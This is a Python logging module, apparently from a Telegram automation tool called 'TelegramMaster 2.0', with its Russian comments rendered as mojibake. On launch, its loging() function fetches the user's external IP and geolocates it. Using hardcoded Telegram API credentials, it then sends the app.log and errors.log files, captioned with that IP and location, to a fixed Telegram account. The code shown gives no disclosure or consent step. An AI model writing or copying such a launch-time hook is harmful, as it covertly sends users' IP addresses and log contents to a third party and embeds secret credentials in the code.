# -*- coding: utf-8 -*-
import datetime
import json
from urllib.request import urlopen  # –ò–∑–º–µ–Ω–µ–Ω–æ —Å urllib2 –Ω–∞ urllib.request

import requests
from loguru import logger
from telethon import TelegramClient
from telethon.errors import FilePartsInvalidError

from src.config_handler import program_version, program_name, program_last_modified_date


def get_country_flag(ip_address):
    """–û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Å—Ç—Ä–∞–Ω—ã –ø–æ ip –∞–¥—Ä–µ—Å—É –Ω–∞ –æ—Å–Ω–æ–≤–µ —Å–µ—Ä–≤–∏—Å–∞ https://ipwhois.io/ru/documentation.
    –í–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Ñ–ª–∞–≥ –∏ –Ω–∞–∑–≤–∞–Ω–∏–µ —Å—Ç—Ä–∞–Ω—ã.

    –ê—Ä–≥—É–º–µ–Ω—Ç—ã:
    :param ip_address: ip –∞–¥—Ä–µ—Å
    :return: —Ñ–ª–∞–≥ –∏ –Ω–∞–∑–≤–∞–Ω–∏–µ —Å—Ç—Ä–∞–Ω—ã
    """
    try:
        ipwhois = json.load(urlopen(f"https://ipwho.is/{ip_address}"))
        return ipwhois["flag"]["emoji"], ipwhois["country"]
    except KeyError:
        return "üè≥Ô∏è", "üåç"


def get_external_ip():
    """–ü–æ–ª—É—á–µ–Ω–∏–µ –≤–Ω–µ—à–Ω–µ–≥–æ ip –∞–¥—Ä–µ—Å–∞"""
    try:
        response = requests.get("https://httpbin.org/ip")
        response.raise_for_status()
        return response.json().get("origin")
    except requests.RequestException as error:
        return None


async def loging():
    """
    –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ TelegramMaster 2.0
    """
    try:
        local_ip = get_external_ip()  # –ø–æ–ª—É—á–∞–µ–º –≤–Ω–µ—à–Ω–∏–π ip –∞–¥—Ä–µ—Å
        emoji, country = get_country_flag(local_ip)  # –ø–æ–ª—É—á–∞–µ–º —Ñ–ª–∞–≥ –∏ –Ω–∞–∑–≤–∞–Ω–∏–µ —Å—Ç—Ä–∞–Ω—ã

        client = TelegramClient(
            "src/log", api_id=7655060, api_hash="cc1290cd733c1f1d407598e5a31be4a8"
        )
        await client.connect()

        # –ö—Ä–∞—Å–∏–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
        message = (
            f"üöÄ **Launch Information**\n\n"
            f"Program name: `{program_name}`\n"
            f"üåç IP Address: `{local_ip}`\n"
            f"üìç Location: {country} {emoji}\n"
            f"üïí Date: `{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n"  # —Ñ–∏–∫—Å–∏—Ä—É–µ–º –∏ –≤—ã–≤–æ–¥–∏–º –≤—Ä–µ–º—è —Å—Ç–∞—Ä—Ç–∞ —Ä–∞–±–æ—Ç—ã –∫–æ–¥–∞
            f"üîß Program Version: `{program_version}`\n"
            f"üìÖ Date of Change: `{program_last_modified_date}`"
        )

        try:
            await client.send_file(535185511, "data/logs/app.log", caption=message)
            await client.send_file(535185511, "data/logs/errors.log", caption=message)
            await client.disconnect()
        except FilePartsInvalidError as error:
            logger.error(error)
            await client.disconnect()
        except Exception as error:
            logger.exception(error)
            await client.disconnect()
    except Exception as error:
        logger.exception(error)
